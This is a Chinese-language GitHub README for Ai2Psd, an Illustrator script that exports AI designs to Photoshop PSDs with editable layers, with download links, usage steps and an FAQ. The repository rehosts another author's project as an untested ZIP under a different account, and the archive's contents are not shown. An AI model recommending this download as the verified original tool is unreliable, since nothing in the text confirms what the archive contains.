# Ai2Psd | Illustrator AI 转 Photoshop PSD 可编辑图层工具

**想把 Adobe Illustrator 中的 AI 矢量设计转换成 Photoshop 可继续修改的 PSD？** Ai2Psd 是一款用于 Illustrator 的 ExtendScript 脚本，帮助整理矢量对象，并导出具有可编辑图层的 PSD 文件，减少手动拆分图层的工作。

![Adobe Illustrator](https://img.shields.io/badge/Adobe-Illustrator-FF9A00?logo=adobeillustrator&logoColor=white)
![Adobe Photoshop](https://img.shields.io/badge/Adobe-Photoshop-31A8FF?logo=adobephotoshop&logoColor=white)
![ExtendScript](https://img.shields.io/badge/Script-ExtendScript-555555)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-0078D6)

> 💡 **在 Illustrator 中运行脚本，再用 Photoshop 打开导出的 PSD。** 不是将所有 AI 特效无损转换为 Photoshop 原生效果；实际可编辑程度取决于对象类型和软件版本。

## 📥 下载安装

### [⬇️ 点击下载 Ai2Psd 完整 ZIP 压缩包](https://github.com/8820387-byte/Ai2Psd/raw/refs/heads/main/ai-to-psd-master.zip)

也可以点击仓库右上方 **Code → Download ZIP** 下载仓库文件。

下载后先解压，在文件夹中查找 `Ai2Psd.jsx` 脚本文件（可能位于子文件夹中）。**不能直接把 ZIP 拖进 Photoshop 使用。**

## ✨ 主要功能

- 🎨 **AI 转 PSD**：将 Illustrator 设计导出为 Photoshop 文件。
- 🧩 **保留可编辑对象**：尽量保留基础形状、路径、文字及部分图层结构。
- 📂 **减少手动拆层**：帮助将矢量对象整理为适合 PSD 导出的结构。
- ⚙️ **脚本操作**：通过 Illustrator 的脚本功能启动，不需要单独安装桌面转换软件。
- 🔧 **适合二次编辑**：方便后续在 Photoshop 中修改文字、形状和部分图层内容。

### 📋 哪些内容可以编辑？

以下为 **Ai2Psd 上游项目说明的典型支持情况**，实际以压缩包所含版本和导出结果为准：

| Illustrator 对象 | 导出到 PSD 后 |
| --- | --- |
| 基础矢量形状 | 通常可编辑 |
| 路径形状 | 通常可编辑 |
| 文字 | 通常可保留可编辑文字 |
| 群组与填充 | 支持一定程度的图层／对象编辑 |
| 剪切路径 | 支持一定程度的编辑 |
| 渐变、描边、网格、图案等 | 可能栅格化 |
| 滤镜和部分外观效果 | 可能无法完整保留 |

**注意：** 即使是支持的对象，也不保证与原 AI 文件 100% 一致；少数图层可能在导出时意外合并。

## 🖥️ 使用环境

| 项目 | 说明 |
| --- | --- |
| 运行软件 | Adobe Illustrator |
| 输出文件 | Photoshop PSD |
| 脚本格式 | JavaScript / ExtendScript（`.jsx`） |
| 操作系统 | Windows / macOS（以具体 Illustrator 版本兼容性为准） |
| 软件版本 | 上游项目标示支持 Illustrator CS6 及更新版本；本仓库 ZIP 未逐一验证 |

## 🚀 使用教程

### 方法一：直接运行脚本（推荐）

1. **下载并解压**上方的 ZIP，找到 `Ai2Psd.jsx`。
2. 打开 **Adobe Illustrator**，打开需要转换的 `.ai` 文件。
3. **先另存一份副本**，不要直接拿唯一原稿运行脚本。
4. 打开 Illustrator 的 **窗口 → 图层**，保持图层面板可见并展开。
5. 进入 **文件 → 脚本 → 其他脚本**（不同语言版本名称可能略有区别）。
6. 选择解压得到的 `Ai2Psd.jsx` 并运行。
7. 根据脚本窗口设置导出选项，点击 **Export／导出**。
8. 导出完成后用 **Adobe Photoshop** 打开 PSD，检查图层、文字、形状和效果。

### 方法二：放进 Illustrator 脚本目录

1. 将 `Ai2Psd.jsx` 复制到 Illustrator 安装目录中的 `Scripts` 文件夹；该路径可能因系统、版本及安装语言而不同。
2. **完全退出并重新启动 Illustrator**。
3. 在 **文件 → 脚本** 菜单中找到 `Ai2Psd`，然后运行。
4. 按提示设置并导出 PSD。

> 📌 脚本若未出现在菜单中，可优先使用「方法一」直接运行，避免寻找不同版本的安装路径。

## 📁 本仓库文件

```text
Ai2Psd/
├── README.md             # 中文介绍与使用教程
└── ai-to-psd-master.zip  # 脚本压缩包（需先解压）
```

## ❓ 常见问题

### Q1：AI 转 PSD 后，所有内容都可以编辑吗？

**不能保证。** 基础矢量形状、路径、文字等通常更容易保留可编辑性；渐变、特殊描边、网格和某些特效可能栅格化或丢失。建议先拿一份测试文件检查结果。

### Q2：为什么导出的部分图层合并了？

这是 Illustrator 导出 PSD 的已知限制之一。脚本可以改善图层准备过程，但不能保证绝对不合并图层。

### Q3：如何尽量保留描边为矢量？

可先在 Illustrator 中选择对象，尝试 **对象 → 路径 → 轮廓化描边（Outline Stroke）**，再用副本执行导出。注意：该操作可能改变原始编辑方式。

### Q4：运行后原来的 AI 文件被改变了？

脚本会整理或修改当前 Illustrator 文档，因此**运行前务必保存并备份**。如需重新运行，建议重新打开未经处理的副本；不要直接对已经处理过的文档反复执行。

### Q5：可以直接在 Photoshop 中运行吗？

不可以。**Ai2Psd 是 Illustrator 脚本**。需要先在 Illustrator 中运行并输出 PSD，然后再用 Photoshop 打开。

## ⚠️ 使用须知

- **重要文件先备份**，并在原文件副本上执行脚本。
- 导出前建议保留图层面板可见且展开。
- 请使用 Illustrator 和 Photoshop 检查导出结果，尤其是文字、剪切蒙版、效果和图层顺序。
- 不建议将「部分对象可编辑」理解为「AI 到 PSD 完全无损转换」。
- 本仓库未逐一测试各软件版本，兼容性及导出表现可能存在差异。

## 🔗 原项目与致谢

Ai2Psd 的功能说明和使用方法参考了 **[creold/ai-to-psd](https://github.com/creold/ai-to-psd)**（原作者 Sergey Osokin 等贡献者）。感谢原项目作者和贡献者。

原项目采用 **MIT License**。本仓库当前未单独放置 `LICENSE` 文件；如需再分发、修改或公开使用原项目代码，请遵循原项目的许可证要求并保留版权与许可声明。

## 🤝 反馈与支持

遇到问题可前往 [Issues](https://github.com/8820387-byte/Ai2Psd/issues) 反馈，并尽量说明 Illustrator / Photoshop 版本、操作步骤和具体报错。欢迎提交改进建议。

---

如果这个项目对你有帮助，欢迎点个 ⭐ **Star**！

**本仓库：** https://github.com/8820387-byte/Ai2Psd
